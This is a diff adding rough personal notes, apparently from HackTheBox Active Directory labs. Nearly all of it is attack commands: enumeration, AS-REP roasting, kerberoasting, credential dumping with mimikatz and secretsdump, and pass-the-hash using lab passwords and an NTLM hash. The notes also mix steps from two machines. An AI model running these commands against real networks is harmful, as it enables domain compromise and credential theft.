@@ -1,0 +1,120 @@
+
+https://juggernaut-sec.com/blog/page/8/
+
+>>nmap -A -sV -sC -T4 10.10.10.175 -p- -oN full_tcp.nmap
+
+
+
+use gobuseter when IIS service is running
+
+>>gobuster dir -u http://10.10.10.175 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,php,txt -t 80 > gobuster.txt
+
+find any information to users
+
+
+ Zone Transfer
+
+>>dig @10.10.10.192 AXFR blackfield.local
+
+ldap search
+now using ldapsearch to find interesting ??
+
+>>ldapsearch<< -H ldap://10.10.10.192 -x -b "dc=BLACKFIELD,dc=local"
+
+
+Enumeration service of domain controller AS-REP Pre authentication accounts
+
+
+>>impacket-GetNPUsers  Egotistical-bank.local/ -dc-ip 10.10.10.175
+
+NUll access with rpcclient and smbclient
+
+>>rpcclient 10.10.10.192 -U""
+>>
+
+no user found!!
+
+
+
+>>kerbrute userenum -d Egotistical-bank.local user.txt --dc 10.10.10.175
+
+find valid username
+
+AS-REP Roasting for this user
+
+When a user needs access to a resource, the Kerberos pre-authentication process begins by sending an authentication server request (AS-REQ) message to the Key Distribution Center (KDC), which resides on the Domain Controller (DC).
+
+The request message contains a timestamp that is encrypted with the hash of the user’s password making the request. The KDC then matches the timestamp with its own record of the user’s password hash, and responds with an Authentication Server Response (AS-REP) message.
+
+
+>>impacket-GetNPUsers  Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
+
+
+Domain Enumeration Continued with valid Credentials
+
+
+crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
+
+crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
+
+evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+
+
+Now Post exploitaiton
+domanin enumeeration command =whoami
+=whoami /priv
+=net user fsmith /domain
+
+
+now check the service accounts
+setspn -T * -F -Q */*
+
+
+find kerberosting accounts
+
+ upload Rubeus.exe
+
+.\Rubeus.exe kerberoast
+
+smb enumeration
+
+smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
+smbclient "\\\\10.10.10.175\\RICOH Aficio SP 8300DN PCL 6" -U "Egotistical-bank.local/fsmith"
+>>recurse on
+>>prompt off
+>>ls
+
+
+then upload .\sharphound.exe and execauted
+
+anaylysis bloodhound report and find kereroating accounts
+
+find shorest path hing value targets
+
+find manualy the service aaccount password and using winpease.execauted
+
+login to the service accounts
+
+after using mimikatz dump the administrator hash value
+
+or using secredump to dump all the hash of the accounts
+
+
+impacket-secretsdump -dc-ip 10.10.10.175 Egotistical-bank/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
+
+
+
+login administrator using pass the hash attacke
+
+evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+
+or using this
+
+impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e Administrator@10.10.10.175
+
+
+
+
+
+
+
